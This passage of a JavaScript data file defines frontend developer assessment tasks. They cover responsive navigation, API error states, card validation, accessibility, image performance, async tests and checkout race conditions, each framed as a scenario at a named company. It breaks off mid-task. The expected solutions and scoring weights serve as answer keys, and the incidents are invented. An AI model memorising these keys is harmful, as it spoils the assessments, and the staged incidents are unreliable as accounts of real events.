// src/data/tasks/frontendTasks.js
// 32 Frontend Developer Main Tasks (4 Levels × 8 Tasks = 32 Tasks, 64 Subtasks)

export const FRONTEND_TASKS = [
  // ==========================================
  // LEVEL 1: FOUNDATION (8 TASKS, 16 SUBTASKS)
  // ==========================================
  {
    id: 'FE-L1-001',
    title: 'Responsive Navigation Drawer Breakdown',
    role: 'frontend',
    level: 1,
    difficulty: 'Foundation',
    company: 'Shopify / Merchant Storefronts',
    department: 'Web Platforms & Mobile Web',
    domain: 'E-Commerce / Mobile UX',
    skills: ['css_responsive', 'html_semantics', 'javascript_dom', 'react_state'],
    coreCompetencies: ['responsive_design', 'debugging', 'mobile_ui'],
    secondarySkills: ['touch_events', 'accessibility'],
    skillTags: ['css', 'responsive', 'mobile', 'navigation', 'flexbox'],
    situation: 'Merchants report that the mobile hamburger navigation bar overflows horizontally on screens narrower than 375px, making the checkout and category links unclickable.',
    problem: 'Fixed pixel widths (width: 420px) on the slide-out drawer cause horizontal scrollbar thrashing and unclickable navigation links on iOS Safari and mobile Chrome.',
    mission: 'Refactor drawer layout to use fluid CSS viewport units (clamp, 100vw), prevent body scroll locking when opened, and verify mobile breakpoints.',
    workspace: {
      tools: ['editor', 'browser', 'terminal'],
      environment: { framework: 'React 18', styling: 'CSS Modules' }
    },
    availableEvidence: [
      'Hotjar recording showing 42% tap drop-off on mobile menu drawer',
      'Sentry CSS overflow alert on iPhone SE (320px viewport)'
    ],
    subtasks: [
      {
        id: 'FE-L1-001-S1',
        title: 'Investigate Viewport Overflow & DOM Inspector',
        objective: 'Inspect Drawer.module.css and identify hardcoded pixel dimensions causing overflow.',
        instructions: 'Open the Live Browser Preview in mobile mode (360px), inspect computed styles on #nav-drawer, and locate width constraints.',
        expectedActions: ['Open browser preview', 'Toggle mobile viewport', 'Locate Drawer.module.css width: 420px rule'],
        successCriteria: ['Identified root cause in CSS width declaration', 'Documented horizontal overflow margin'],
        evaluationCriteria: { accuracy: 50, investigationDepth: 50 }
      },
      {
        id: 'FE-L1-001-S2',
        title: 'Implement Fluid Responsive Drawer & Body Lock',
        objective: 'Convert fixed width to max-width: min(85vw, 360px) and add overflow: hidden to body when open.',
        instructions: 'Update Drawer component with CSS clamp/flexbox and verify navigation items stack cleanly down to 320px screen widths.',
        expectedActions: ['Modify Drawer.module.css', 'Add useEffect body scroll lock toggle', 'Verify zero horizontal scrollbar in preview'],
        successCriteria: ['Menu opens smoothly without horizontal scrollbar', 'All links clickable on 320px viewport'],
        evaluationCriteria: { codeQuality: 50, verification: 50 }
      }
    ],
    decisionPoints: ['Use CSS clamp() vs standard media query breakpoints', 'Portal rendering vs inline absolute positioning'],
    pressureEvents: ['Merchant Slack alert: Flash sale starting in 15 minutes, mobile traffic surging'],
    expectedSolution: 'Replace width: 420px with width: 100%; max-width: 340px; box-sizing: border-box; and lock body scroll.',
    acceptableApproaches: ['CSS clamp formula', 'Tailwind responsive classes max-w-[85vw]'],
    failureConditions: ['Menu still clips off-screen on 320px screens', 'Closing drawer leaves body scroll disabled'],
    finalDeliverable: 'Patched Drawer.jsx and Drawer.module.css with verified mobile rendering.',
    evaluationCriteria: { responsiveness: 40, stateSafety: 30, testHygiene: 30 },
    workplaceContext: 'Mobile E-Commerce Navigation Fix',
    taskType: 'responsive_debugging'
  },

  {
    id: 'FE-L1-002',
    title: 'API Loading & Unhandled Network Error State',
    role: 'frontend',
    level: 1,
    difficulty: 'Foundation',
    company: 'DoorDash / Consumer Web',
    department: 'Order Placement UI',
    domain: 'Food Delivery / Real-time Ordering',
    skills: ['api_integration', 'react_state', 'error_handling', 'user_feedback'],
    coreCompetencies: ['api_error_handling', 'state_management', 'resilience'],
    secondarySkills: ['skeleton_loaders', 'fetch_api'],
    skillTags: ['api', 'fetch', 'error_handling', 'loading_states', 'react'],
    situation: 'During restaurant rush hours, the dish recommendation carousel silently goes blank when the recommendation microservice encounters temporary 503 errors.',
    problem: 'The component calls fetch() without a .catch() block or HTTP status check, leaving the loading spinner active indefinitely when the server returns non-200.',
    mission: 'Implement explicit loading, error, and empty states with a user-friendly retry button and timeout protection.',
    workspace: {
      tools: ['editor', 'browser', 'terminal', 'jira'],
      environment: { framework: 'React 18', api: 'REST fetch' }
    },
    availableEvidence: [
      'Customer support chat: "Screen is stuck loading recommendations for 10 minutes"',
      'Chrome console error: Uncaught (in promise) TypeError: Failed to fetch'
    ],
    subtasks: [
      {
        id: 'FE-L1-002-S1',
        title: 'Diagnose Unhandled Promise & Silent Spinner Trap',
        objective: 'Reproduce the failed API call and observe how the UI handles 503 response codes.',
        instructions: 'Simulate a 503 gateway response in the browser preview and inspect component state variables.',
        expectedActions: ['Trigger mock 503 in preview', 'Inspect React Developer Tools state for isLoading'],
        successCriteria: ['Confirmed that isLoading remains true on API rejection', 'Isolated missing error state setter'],
        evaluationCriteria: { diagnosis: 50, rootCauseIsolation: 50 }
      },
      {
        id: 'FE-L1-002-S2',
        title: 'Build Resilient Error Boundary & Retry Trigger',
        objective: 'Add try/catch/finally block with status code validation and a Retry Recommendation button.',
        instructions: 'Write error state rendering with an actionable retry callback and display an informative fallback banner.',
        expectedActions: ['Update RecommendationGrid.jsx', 'Implement hasError state and retry fetch handler', 'Verify UI recovers when API returns 200'],
        successCriteria: ['UI displays friendly error banner on 503', 'Clicking retry successfully fetches data'],
        evaluationCriteria: { implementation: 50, UXResilience: 50 }
      }
    ],
    decisionPoints: ['Auto-retry with timer vs manual user-triggered retry button', 'Toast notification vs inline banner'],
    pressureEvents: ['Ops alert: Recommendation service degraded, 8% of requests failing'],
    expectedSolution: 'Implement try/catch around fetch, check response.ok, set state isLoading(false) in finally, and render Retry button.',
    acceptableApproaches: ['React Query useQuery with retry', 'Custom useFetch hook with status enum'],
    failureConditions: ['Spinner keeps spinning on 500/503', 'Retry causes infinite loop'],
    finalDeliverable: 'RecommendationGrid.jsx with complete loading/error/retry lifecycle.',
    evaluationCriteria: { errorResilience: 40, stateCleanliness: 30, UXClarity: 30 },
    workplaceContext: 'Consumer Web Error Recovery',
    taskType: 'api_error_handling'
  },

  {
    id: 'FE-L1-003',
    title: 'Payment Checkout Client-Side Form Validation',
    role: 'frontend',
    level: 1,
    difficulty: 'Foundation',
    company: 'Stripe / Payment Gateway UI',
    department: 'Billing & Checkout Components',
    domain: 'Fintech / Checkout Systems',
    skills: ['form_validation', 'javascript_regex', 'accessibility', 'react_state'],
    coreCompetencies: ['form_validation', 'user_input_sanitization', 'frontend_security'],
    secondarySkills: ['luhn_algorithm', 'aria_attributes'],
    skillTags: ['forms', 'validation', 'regex', 'luhn', 'checkout'],
    situation: 'Card payment forms allow users to submit malformed credit card numbers (13 digits instead of 16) and expired expiry dates, creating unnecessary card decline fees.',
    problem: 'Validation only runs on form onSubmit without real-time field formatting, missing the Luhn checksum check and allowing invalid submissions.',
    mission: 'Add real-time card number masking (XXXX XXXX XXXX XXXX), Luhn validation check, and MM/YY expiry date constraints with inline accessible error labels.',
    workspace: {
      tools: ['editor', 'browser', 'terminal'],
      environment: { framework: 'React 18', formSystem: 'Controlled Inputs' }
    },
    availableEvidence: [
      'Stripe billing telemetry: 18% card submission decline rate due to invalid card length',
      'Accessibility ticket: Screen reader does not announce form field errors'
    ],
    subtasks: [
      {
        id: 'FE-L1-003-S1',
        title: 'Audit Form Input Validation & Error Propagation',
        objective: 'Test invalid inputs in PaymentForm.jsx and trace how validation states are calculated.',
        instructions: 'Input invalid card lengths and past dates in the browser preview; note missing validation states.',
        expectedActions: ['Input invalid card numbers', 'Check console warnings and submit behavior'],
        successCriteria: ['Identified that submit fires with invalid data', 'Mapped missing validation rules'],
        evaluationCriteria: { auditAccuracy: 50, testCompleteness: 50 }
      },
      {
        id: 'FE-L1-003-S2',
        title: 'Implement Luhn Check, Input Masking & ARIA Alerts',
        objective: 'Write card input formatting, Luhn algorithm verification, and aria-invalid attributes.',
        instructions: 'Format card numbers in chunks of 4 digits, disable submit until fields are valid, and add aria-describedby for error labels.',
        expectedActions: ['Implement validateCardNumber function', 'Add auto-spacing mask on onChange', 'Connect aria-invalid and aria-errormessage'],
        successCriteria: ['Invalid cards cannot be submitted', 'Screen reader announcements functional'],
        evaluationCriteria: { validationStrictness: 50, codeHygiene: 50 }
      }
    ],
    decisionPoints: ['Real-time validation on change vs on blur', 'External validation library vs lightweight custom Luhn helper'],
    pressureEvents: ['Compliance reminder: PCI-DSS requires client-side card format validation before network dispatch'],
    expectedSolution: 'Implement Luhn modulus 10 checker, format card spacing, and bind aria-invalid with dynamic error banner.',
    acceptableApproaches: ['Controlled React component state', 'HTML5 constraint validation with custom validity'],
    failureConditions: ['Valid card numbers rejected', 'Card spaces not stripped before payload generation'],
    finalDeliverable: 'PaymentForm.jsx with real-time masking, Luhn validation, and accessible feedback.',
    evaluationCriteria: { validationAccuracy: 40, accessibility: 30, UXFeedback: 30 },
    workplaceContext: 'Fintech Payment Field Validation',
    taskType: 'form_validation'
  },

  {
    id: 'FE-L1-004',
    title: 'Accessibility (WCAG 2.1 AA) Contrast & Keyboard Trap',
    role: 'frontend',
    level: 1,
    difficulty: 'Foundation',
    company: 'GovTech / Public Portal Services',
    department: 'Digital Inclusion & Design Systems',
    domain: 'Public Services / Accessibility',
    skills: ['accessibility', 'css_styling', 'html_semantics', 'keyboard_navigation'],
    coreCompetencies: ['accessibility', 'wcag_compliance', 'inclusive_design'],
    secondarySkills: ['screen_readers', 'focus_management'],
    skillTags: ['a11y', 'wcag', 'color_contrast', 'focus_trap', 'aria'],
    situation: 'An automated accessibility compliance audit flagged the citizen benefits portal with critical WCAG 2.1 AA violations on low color contrast and modal focus trapping.',
    problem: 'Modal dialog has light-gray text on white (#9ca3af on #ffffff, 2.3:1 contrast ratio) and tab key cycles out of the modal to hidden background links.',
    mission: 'Remediate color contrast to meet 4.5:1 ratio, trap keyboard focus within the open modal, and restore focus to the trigger button on modal close.',
    workspace: {
      tools: ['editor', 'browser', 'terminal'],
      environment: { framework: 'React 18', a11yTool: 'axe-core test runner' }
    },
    availableEvidence: [
      'Axe-core scan: 4 critical violations on #benefits-modal',
      'Video test: Blind user unable to close modal using Esc key or Shift+Tab'
    ],
    subtasks: [
      {
        id: 'FE-L1-004-S1',
        title: 'Run Axe-Core Audit & Map Focus Leaks',
        objective: 'Execute accessibility tests in the terminal and map keyboard focus sequence in preview.',
        instructions: 'Run `npm test -- a11y` in the terminal and use the Tab key in browser preview to verify the focus trap failure.',
        expectedActions: ['Run terminal a11y test suite', 'Verify Tab key escapes active modal window'],
        successCriteria: ['Mapped all 4 axe-core violations', 'Verified focus leak in DOM tree'],
        evaluationCriteria: { auditSpeed: 50, observationAccuracy: 50 }
      },
      {
        id: 'FE-L1-004-S2',
        title: 'Implement WCAG AA Color Palette & Focus Loop',
        objective: 'Update text color to #374151 (7.2:1 contrast), attach keydown listener for Esc/Tab loop, and restore trigger focus.',
        instructions: 'Update Modal.jsx with focus trap hook or useRef keydown handler, update CSS color tokens, and verify axe-core passes 100%.',
        expectedActions: ['Update CSS text tokens to #374151', 'Add keydown handler for Escape and Tab cycling', 'Run npm test to verify axe-core passing'],
        successCriteria: ['Axe-core scan reports 0 violations', 'Modal can be navigated and closed purely via keyboard'],
        evaluationCriteria: { a11yCompliance: 50, testPassage: 50 }
      }
    ],
    decisionPoints: ['Custom focus trap hook vs headless UI library', 'Dialog role vs alertdialog role'],
    pressureEvents: ['Legal compliance deadline: Federal accessibility audit submission in 1 hour'],
    expectedSolution: 'Increase text contrast to #374151, bind Tab to wrap within first/last focusable elements, bind Escape to close modal and restore focus.',
    acceptableApproaches: ['Focus trap custom hook with querySelectorAll', 'HTML <dialog> element showModal API'],
    failureConditions: ['Color contrast remains below 4.5:1', 'Shift+Tab breaks out into address bar'],
    finalDeliverable: 'Accessible Modal.jsx passing all axe-core automated assertions.',
    evaluationCriteria: { wcagCompliance: 40, keyboardUX: 30, testVerification: 30 },
    workplaceContext: 'Government Web Accessibility Remediation',
    taskType: 'accessibility'
  },

  {
    id: 'FE-L1-005',
    title: 'Design System Component Reusability & Prop Explosion',
    role: 'frontend',
    level: 1,
    difficulty: 'Foundation',
    company: 'Airbnb / Core Design Systems',
    department: 'Design Technology & UI Library',
    domain: 'Hospitality / Design Systems',
    skills: ['component_architecture', 'react_props', 'typescript', 'clean_code'],
    coreCompetencies: ['component_architecture', 'design_systems', 'refactoring'],
    secondarySkills: ['polymorphic_components', 'composition'],
    skillTags: ['react', 'components', 'props', 'design_systems', 'refactoring'],
    situation: 'The company Button component has accumulated 26 conflicting boolean props (isSubmit, isCancel, isSmall, isBig, hasIcon, isPill), leading to unpredictable CSS styles.',
    problem: 'Developers keep adding custom props instead of using structured variants and composition, creating rendering regressions across checkout buttons.',
    mission: 'Refactor Button.jsx into a clean variant-based design system component (variant: primary | secondary | danger | ghost, size: sm | md | lg) with polymorphic "as" support.',
    workspace: {
      tools: ['editor', 'browser', 'terminal'],
      environment: { framework: 'React 18', storybook: 'Component Showcase' }
    },
    availableEvidence: [
      'Design review Jira ticket: Primary button turns green instead of black when isSubmit and isCancel are both true',
      'PR comments from senior engineer asking for variant consolidation'
    ],
    subtasks: [
      {
        id: 'FE-L1-005-S1',
        title: 'Analyze Conflicting Props & Identify Breakages',
        objective: 'Inspect Button.jsx prop matrix and identify mutually exclusive prop collisions.',
        instructions: 'Check existing component instances in the browser preview and test overlapping boolean flags.',
        expectedActions: ['Inspect Button.jsx props interface', 'Identify boolean flag precedence bugs in classnames logic'],
        successCriteria: ['Documented 6 conflicting prop combinations', 'Formulated variant enum mapping'],
        evaluationCriteria: { analysisClarity: 50, designSystemInsight: 50 }
      },
      {
        id: 'FE-L1-005-S2',
        title: 'Refactor to Variant-Driven API & Polymorphic Element',
        objective: 'Rewrite Button to accept variant, size, leftIcon, and rest props with standard HTML attributes forwarding.',
        instructions: 'Use a structured dictionary for variant styling, add prop defaults, forward ref, and ensure backwards compatibility shim.',
        expectedActions: ['Rewrite Button.jsx with variant mapping', 'Implement forwardRef and ...rest forwarding', 'Verify existing buttons render correctly'],
        successCriteria: ['All 26 boolean flags replaced by 2 clean enums', 'Unit tests for all button variants pass'],
        evaluationCriteria: { apiDesign: 50, backwardsCompatibility: 50 }
      }
    ],
    decisionPoints: ['Strict breaking change vs backward-compatibility shim with deprecation warnings', 'Compound component vs single element'],
    pressureEvents: ['Frontend sprint retro in 30 minutes: Need clean component API for junior team members'],
    expectedSolution: 'Create structured variant/size lookup maps, pass ...props, forwardRef, and provide fallback translation for legacy props.',
    acceptableApproaches: ['Class Variance Authority (CVA) style mapping', 'Plain object dictionary lookup'],
    failureConditions: ['Custom onClick or aria-label attributes swallowed', 'Breaking existing checkout page buttons'],
    finalDeliverable: 'Refactored, clean Button.jsx with documented variants and 100% test coverage.',
    evaluationCriteria: { componentElegance: 40, robustness: 30, testPassing: 30 },
    workplaceContext: 'Design System Component Modernization',
    taskType: 'component_architecture'
  },

  {
    id: 'FE-L1-006',
    title: 'Hero Banner Largest Contentful Paint (LCP) Degradation',
    role: 'frontend',
    level: 1,
    difficulty: 'Foundation',
    company: 'Pinterest / Web Platform Performance',
    department: 'Core Web Vitals Engineering',
    domain: 'Social Media / High-Traffic Media',
    skills: ['performance_opt', 'html_media', 'core_web_vitals', 'network_throttling'],
    coreCompetencies: ['frontend_performance', 'image_optimization', 'core_web_vitals'],
    secondarySkills: ['lighthouse', 'webp_avif'],
    skillTags: ['performance', 'lcp', 'images', 'web_vitals', 'optimization'],
    situation: 'Google Search Console notified marketing that the landing page LCP score jumped from 1.8s to 4.6s (Needs Improvement), harming SEO organic ranking.',
    problem: 'A newly added 4.8MB uncompressed PNG hero image is lazy-loaded with loading="lazy" without dimensions, delaying browser download until after initial render.',
    mission: 'Convert hero image to modern WebP/AVIF format with srcset, add fetchpriority="high", remove loading="lazy" from the LCP image, and specify explicit aspect-ratio.',
    workspace: {
      tools: ['editor', 'browser', 'terminal'],
      environment: { framework: 'React 18', tooling: 'Lighthouse CLI' }
    },
    availableEvidence: [
      'Lighthouse report: LCP 4.6s (Failed threshold: 2.5s)',
      'Network tab: hero_banner.png is 4.8MB transferred over 3.2s'
    ],
    subtasks: [
      {
        id: 'FE-L1-006-S1',
        title: 'Profile LCP Element via DevTools & Network Waterfall',
        objective: 'Run Lighthouse in the terminal and identify the blocking image resource.',
        instructions: 'Execute `npm run perf:audit` and inspect the Network waterfall timeline for hero image priority.',
        expectedActions: ['Run Lighthouse audit command', 'Inspect element markup and fetch priority in browser preview'],
        successCriteria: ['Identified hero_banner.png as the sole LCP bottleneck', 'Noted anti-pattern loading="lazy" on hero banner'],
        evaluationCriteria: { diagnosticSpeed: 50, metricAccuracy: 50 }
      },
      {
        id: 'FE-L1-006-S2',
        title: 'Optimize Image Delivery, Preload & Layout Shift',
        objective: 'Implement responsive picture element with WebP sources, fetchpriority="high", and explicit width/height.',
        instructions: 'Update HeroBanner.jsx with modern <picture> tag, add link rel="preload" tag, and run Lighthouse audit to confirm LCP < 2.0s.',
        expectedActions: ['Update HeroBanner.jsx with responsive srcset', 'Add fetchpriority="high"', 'Rerun Lighthouse audit'],
        successCriteria: ['LCP drops below 2.0s', 'Cumulative Layout Shift (CLS) remains 0.00'],
        evaluationCriteria: { performanceGain: 50, codeImplementation: 50 }
      }
    ],
    decisionPoints: ['Using Next.js Image component vs native HTML picture tag', 'AVIF vs WebP format fallback'],
    pressureEvents: ['Marketing VP on Slack: Google SEO penalty expected on Monday if LCP is not in green zone (< 2.5s)'],
    expectedSolution: 'Remove loading="lazy", add fetchpriority="high", provide responsive WebP srcset, and declare aspect-ratio: 16/9.',
    acceptableApproaches: ['HTML5 picture element with media queries', 'Preload link tag in head + modern format'],
    failureConditions: ['Image flashes or shifts layout on load (CLS > 0.1)', 'Hero banner fails to render on Safari'],
    finalDeliverable: 'Optimized HeroBanner.jsx achieving Lighthouse score > 90 and LCP < 2.0s.',
    evaluationCriteria: { speedImprovement: 40, responsiveLayout: 30, verification: 30 },
    workplaceContext: 'Core Web Vitals SEO Remediation',
    taskType: 'performance'
  },

  {
    id: 'FE-L1-007',
    title: 'Vitest Unit Test Suite Assertions Failure in CI Pipeline',
    role: 'frontend',
    level: 1,
    difficulty: 'Foundation',
    company: 'GitLab / Frontend Core Engine',
    department: 'Quality Engineering & CI/CD',
    domain: 'DevOps & Developer Tooling',
    skills: ['testing_qa', 'vitest', 'react_testing_library', 'mocking'],
    coreCompetencies: ['testing_qa', 'unit_testing', 'debugging'],
    secondarySkills: ['async_testing', 'jest_dom'],
    skillTags: ['testing', 'vitest', 'unit_tests', 'ci_cd', 'qa'],
    situation: 'A pull request is blocked in GitHub Actions CI because 3 unit tests in UserSettings.test.jsx failed after a recent state refactoring.',
    problem: 'Tests fail because userEvent.click() is not awaited, mocked network promises do not flush properly, and getByText fails on asynchronous DOM insertion.',
    mission: 'Debug the failing test file, correctly await async user events, replace getByText with findByText for async elements, and mock API responses cleanly.',
    workspace: {
      tools: ['editor', 'terminal', 'git'],
      environment: { framework: 'Vitest 1.3 / React Testing Library 14' }
    },
    availableEvidence: [
      'CI log: FAIL src/tests/UserSettings.test.jsx: "Unable to find an element with text: Settings Saved"',
      'Warning: An update to UserSettings inside a test was not wrapped in act(...)'
    ],
    subtasks: [
      {
        id: 'FE-L1-007-S1',
        title: 'Run Vitest in Watch Mode & Isolate Failures',
        objective: 'Execute test runner in terminal and identify the three failing assertion points.',
        instructions: 'Run `npm test UserSettings` in the terminal and inspect the error stack trace.',
        expectedActions: ['Execute npm test command', 'Analyze failure reasons: un-awaited userEvent and async timing'],
        successCriteria: ['Isolated 3 failing assertions in UserSettings.test.jsx', 'Understood act() warning cause'],
        evaluationCriteria: { errorDiagnosis: 50, testUnderstanding: 50 }
      },
      {
        id: 'FE-L1-007-S2',
        title: 'Fix Async Assertions, Mock Handlers & Pass CI',
        objective: 'Use await userEvent, switch to screen.findByRole/findByText, and mock the user update API.',
        instructions: 'Refactor test assertions to handle asynchronous lifecycle and run the full test suite to verify 100% pass rate.',
        expectedActions: ['Add await to userEvent calls', 'Replace getBy with findBy', 'Mock fetch with vi.fn().mockResolvedValueOnce', 'Rerun npm test'],
        successCriteria: ['All tests in UserSettings.test.jsx pass green', 'Zero act() console warnings remain'],
        evaluationCriteria: { testFixAccuracy: 50, testResilience: 50 }
      }
    ],
    decisionPoints: ['waitFor helper vs native findBy queries', 'MSW (Mock Service Worker) vs direct vi.spyOn'],
    pressureEvents: ['Tech Lead: "Sprint release branch cut in 45 minutes, need green CI pipeline to merge PR"'],
    expectedSolution: 'Await userEvent.type/click, use findByText for notification toast, and provide clean vi.fn mock response.',
    acceptableApproaches: ['React Testing Library async findBy queries', 'waitFor assertion block with explicit timeout'],
    failureConditions: ['Using arbitrary setTimeout in tests', 'Tests pass only because assertions are commented out'],
    finalDeliverable: 'Patched UserSettings.test.jsx with 100% green test suite passing in CI.',
    evaluationCriteria: { testQuality: 40, asyncCorrectness: 30, executionSpeed: 30 },
    workplaceContext: 'Continuous Integration Test Remediation',
    taskType: 'testing_qa'
  },

  {
    id: 'FE-L1-008',
    title: 'React Counter & Stale Closure State Desynchronization',
    role: 'frontend',
    level: 1,
    difficulty: 'Foundation',
    company: 'Robinhood / Retail Trading Experience',
    department: 'Stock Ticker & Live Order Desk',
    domain: 'Fintech / Retail Trading',
    skills: ['react_state', 'react_hooks', 'closures', 'state_synchronization'],
    coreCompetencies: ['state_management', 'react_lifecycle', 'debugging'],
    secondarySkills: ['use_effect', 'use_callback'],
    skillTags: ['react', 'state', 'hooks', 'stale_closures', 'use_effect'],
    situation: 'Traders using the Quick Buy share increment button notice that clicking rapidly increments by only 1 share instead of 5, resulting in order size errors.',
    problem: 'The increment function uses setCount(count + 1) inside a debounced setTimeout closure, reading a stale snapshot of count from previous render.',
    mission: 'Refactor state updates to functional form setCount(prev => prev + 1), clean up timer effects on unmount, and prevent race conditions during rapid user clicks.',
    workspace: {
      tools: ['editor', 'browser', 'terminal'],
      environment: { framework: 'React 18' }
    },
    availableEvidence: [
      'Customer complaint: "I clicked + 5 times rapidly and the order only placed 1 share!"',
      'React DevTools profiler recording showing stale closure count overwrite'
    ],
    subtasks: [
      {
        id: 'FE-L1-008-S1',
        title: 'Reproduce Rapid Click State Loss in Browser Preview',
        objective: 'Inspect QuickShareCounter.jsx and observe state loss during rapid consecutive clicks.',
        instructions: 'Click the + button 5 times within 500ms in the browser preview and observe counter behavior.',
        expectedActions: ['Click increment rapidly in preview', 'Verify counter displays 1 or 2 instead of 5'],
        successCriteria: ['Reproduced stale closure state overwrite', 'Identified direct state reference bug'],
        evaluationCriteria: { reproductionAccuracy: 50, explanation: 50 }
      },
      {
        id: 'FE-L1-008-S2',
        title: 'Implement Functional State Updates & Effect Cleanup',
        objective: 'Update setter to functional updater pattern and ensure interval/timeout is safely garbage collected.',
        instructions: 'Change setCount(count + 1) to setCount(prev => prev + 1) and test with automated rapid click simulator.',
        expectedActions: ['Modify QuickShareCounter.jsx', 'Implement functional state updater', 'Verify 10 rapid clicks produce exactly 10'],
        successCriteria: ['Counter updates accurately regardless of click speed', 'Timer cleanup prevents memory leaks'],
        evaluationCriteria: { codeCleanliness: 50, verificationPassing: 50 }
      }
    ],
    decisionPoints: ['Functional useState updater vs useReducer for atomic increments', 'useRef for tracking latest value'],
    pressureEvents: ['Trading desk notice: Market opens in 20 minutes, order entry must be reliable'],
    expectedSolution: 'Use setCount(prevCount => prevCount + 1) to always update against latest committed state.',
    acceptableApproaches: ['Functional state updater', 'useReducer state machine'],
    failureConditions: ['State still drops clicks under rapid input', 'Component memory leak when navigating away during timer'],
    finalDeliverable: 'QuickShareCounter.jsx with guaranteed state synchronization under high-frequency clicks.',
    evaluationCriteria: { stateIntegrity: 40, hookCleanliness: 30, testValidation: 30 },
    workplaceContext: 'Financial Trading Interface State Safety',
    taskType: 'state_management'
  },

  // =============================================
  // LEVEL 2: INTERMEDIATE (8 TASKS, 16 SUBTASKS)
  // =============================================
  {
    id: 'FE-L2-001',
    title: 'Search Autocomplete Asynchronous Race Condition',
    role: 'frontend',
    level: 2,
    difficulty: 'Intermediate',
    company: 'Spotify / Web Player Team',
    department: 'Search & Discovery UI',
    domain: 'Streaming Media / Search Experience',
    skills: ['api_integration', 'react_state', 'async_programming', 'performance_opt'],
    coreCompetencies: ['async_programming', 'debouncing', 'cancellation'],
    secondarySkills: ['abort_controller', 'search_ux'],
    skillTags: ['async', 'race_condition', 'abort_controller', 'debounce', 'search'],
    situation: 'Users searching for music tracks report that typing "jazz" briefly shows jazz results, but then suddenly displays older results for "rock".',
    problem: 'Rapid keystrokes dispatch concurrent asynchronous search API requests. An earlier slower request resolves after a later faster request, overwriting latest UI state.',
    mission: 'Implement AbortController to cancel stale in-flight requests on new input and wrap input with 300ms debounce to prevent server spam.',
    workspace: {
      tools: ['editor', 'browser', 'terminal'],
      environment: { framework: 'React 18', searchApi: 'REST /api/v1/search' }
    },
    availableEvidence: [
      'Network tab: Request 1 query="ja" took 850ms; Request 2 query="jazz" took 200ms; Request 1 arrived last and rendered',
      'User bug reports: Search results do not match input in search box'
    ],
    subtasks: [
      {
        id: 'FE-L2-001-S1',
        title: 'Trace Async Network Waterfall & Out-of-Order Responses',
        objective: 'Inspect SearchBar.jsx and simulate variable network latency to observe race condition.',
        instructions: 'Open browser preview, set artificial network latency to random, type fast, and inspect query vs rendered titles.',
        expectedActions: ['Trigger fast keystrokes in search bar', 'Verify out-of-order response state collision'],
        successCriteria: ['Demonstrated stale search results overwriting newer results', 'Isolated lack of request cancellation'],
        evaluationCriteria: { diagnosis: 50, rootCauseDetail: 50 }
      },
      {
        id: 'FE-L2-001-S2',
        title: 'Deploy AbortController & 300ms Debounce Strategy',
        objective: 'Cancel preceding fetch requests via AbortController signal and throttle inputs with 300ms debounce.',
        instructions: 'Integrate AbortController in useEffect cleanup, add debounce helper, and run Vitest suite to verify race safety.',
        expectedActions: ['Create AbortController in useEffect', 'Pass controller.signal to fetch call', 'Add cleanup return () => controller.abort()', 'Add debounce delay'],
        successCriteria: ['Stale requests aborted cleanly without uncaught console errors', 'Search results strictly match latest input'],
        evaluationCriteria: { implementation: 50, testsPassing: 50 }
      }
    ],
    decisionPoints: ['Custom debounce utility vs lodash.debounce', 'AbortController signal vs active request ID timestamp check'],
    pressureEvents: ['Product Manager: User drop-off on search is up 22% due to mismatched song lists'],
    expectedSolution: 'Instantiate new AbortController per query, abort previous signal in useEffect cleanup, ignore AbortError in catch block.',
    acceptableApproaches: ['AbortController with fetch signal', 'Sequence counter checking if response belongs to active query'],
    failureConditions: ['AbortError logs uncaught exception to console', 'Search fails entirely when user types slowly'],
    finalDeliverable: 'SearchBar.jsx with AbortController cancellation and 300ms debounce.',
    evaluationCriteria: { asyncCorrectness: 40, performance: 30, testValidation: 30 },
    workplaceContext: 'High-Volume Search Interface Race Condition',
    taskType: 'async_debugging'
  },

  {
    id: 'FE-L2-002', // Also preserves reference FE-CRIT-049 / task-fe-api-failure
    aliasId: 'task-fe-api-failure',
    missionCode: 'FE-CRIT-049',
    title: 'API Failure & Race Condition in Checkout Pipeline',
    role: 'frontend',
    level: 2,
    difficulty: 'Intermediate',
    company: 'DayOne Pay / Core Merchant Checkout',
    department: 'Web Engineering & Platforms',
    domain: 'Fintech / Checkout Engineering',
    skills: ['api_integration', 'react_state', 'testing_qa', 'financial_precision'],
    coreCompetencies: ['debugging', 'resilience', 'financial_math', 'testing_qa'],
    secondarySkills: ['exponential_backoff', 'idempotency'],
    skillTags: ['checkout', 'race_condition', '504_timeout', 'retry', 'vitest'],
    situation: 'Customers attempting checkout with slow mobile connections experience infinite loading spinners or duplicate charge errors. Sentry logs indicate uncaught 504 Gateway Timeouts and unhandled Promise rejections in checkoutApi.js.',
    problem: 'Production API calls fail silently under poor network conditions without exponential backoff retry; floating point math causes rounding errors on discount calculations.',
    mission: 'Review Jira PROD-4092, inspect checkoutApi.js, implement exponential backoff retry logic, apply Number.EPSILON financial rounding, and pass all 4 Vitest assertions.',
    workspace: {
      tools: ['slack', 'jira', 'editor', 'terminal', 'browser', 'git', 'ai_assistant'],
      environment: { runtime: 'Node.js v20.11 / Vite 5.2 / React 18.2', targetFile: 'src/services/checkoutApi.js' }
    },
    availableEvidence: [
      '[14:02:11] Sentry Alert: Uncaught (in promise) Error: Gateway Timeout (504) at /api/v2/checkout',
      'Customer Support Ticket #9812: "My card was charged twice when the spinner froze!"',
      'Terminal: FAIL src/tests/checkoutApi.test.js (3 failed, 1 passed)'
    ],
    subtasks: [
      {
        id: 'FE-L2-002-S1',
        title: 'Review Jira PROD-4092 & Reproduce 504 in Browser Preview',
        objective: 'Check Jira acceptance criteria, open Browser Preview, and reproduce the unhandled timeout error.',
        instructions: 'Open Jira tool to read ticket PROD-4092, switch to Browser Preview, apply promo code DAYONE20, and click Pay Now.',
        expectedActions: ['Open Jira tool', 'Open Browser Preview', 'Trigger payment to observe 504 Gateway Timeout'],
        successCriteria: ['Reproduced 504 timeout error in browser console', 'Identified IEEE 754 precision bug (119.20000000000002)'],
        evaluationCriteria: { triageAccuracy: 50, ticketUnderstanding: 50 }
      },
      {
        id: 'FE-L2-002-S2',
        title: 'Implement Exponential Backoff Retry & Financial Rounding',
        objective: 'Patch checkoutApi.js with retry loop, AbortController timeout, and Number.EPSILON math, then pass unit tests and commit to git.',
        instructions: 'In Monaco Editor, implement retry logic with exponential backoff (maxRetries = 3), fix discount rounding with Math.round, run npm test in Terminal, and commit via Git tool.',
        expectedActions: ['Edit src/services/checkoutApi.js', 'Run npm test in terminal', 'Verify 4/4 passing tests', 'Commit changes via Git tool'],
